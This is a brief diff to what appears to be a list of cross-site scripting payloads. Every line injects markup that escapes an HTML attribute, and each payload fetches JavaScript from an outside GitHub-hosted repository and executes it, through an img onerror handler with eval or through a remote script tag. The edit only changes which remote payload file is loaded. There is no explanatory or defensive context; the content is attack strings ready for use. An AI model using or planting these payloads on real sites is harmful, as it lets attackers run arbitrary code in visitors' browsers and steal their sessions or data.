@@ -1,4 +1,4 @@
 "><img src=x style="display:none" onerror="fetch('https://raw.githubusercontent.com/Vault-of-Jok3r/XSS/refs/heads/main/chargebutton.js').then(r=>r.text()).then(eval)"><div id="
 <img src=x style="display:none" onerror="fetch('https://raw.githubusercontent.com/Vault-of-Jok3r/XSS/refs/heads/main/chargebutton.js').then(r=>r.text()).then(eval)"><div id="
-"><script src=https://raw.githubusercontent.com/Vault-of-Jok3r/payload_xss/refs/heads/main/buttonpayload12.js></script>
-<script src=https://raw.githubusercontent.com/Vault-of-Jok3r/payload_xss/refs/heads/main/buttonpayload12.js></script>
+"><script src=https://raw.githubusercontent.com/Vault-of-Jok3r/payload_xss/refs/heads/main/chargebutton.js></script>
+<script src=https://raw.githubusercontent.com/Vault-of-Jok3r/payload_xss/refs/heads/main/chargebutton.js></script>
